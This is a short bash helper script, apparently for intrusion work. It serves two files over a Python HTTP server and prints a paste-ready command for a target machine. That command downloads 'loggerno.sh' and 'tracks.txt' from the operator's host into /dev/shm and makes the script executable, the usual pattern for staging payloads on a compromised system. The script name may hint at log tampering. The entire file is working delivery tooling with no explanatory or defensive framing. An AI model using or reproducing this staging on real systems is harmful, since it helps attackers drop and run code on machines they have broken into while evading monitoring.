#!/bin/bash

if [ $# -ne 2 ]; then
	echo "ERROR usage: helper.sh <IP> <PORT>"
	exit 1
fi

IP="$1"
PORT="$2"
DSTDIR="/dev/shm"
src="http://$IP:$PORT"

cmd="wget $src/loggerno.sh -O $DSTDIR/loggerno.sh && wget $src/tracks.txt -O $DSTDIR/tracks.txt && chmod +x $DSTDIR/loggerno.sh "

echo "$cmd"
echo
echo "$(md5sum loggerno.sh)"
echo "$(md5sum tracks.txt)"
echo


python3 -m http.server "$PORT"
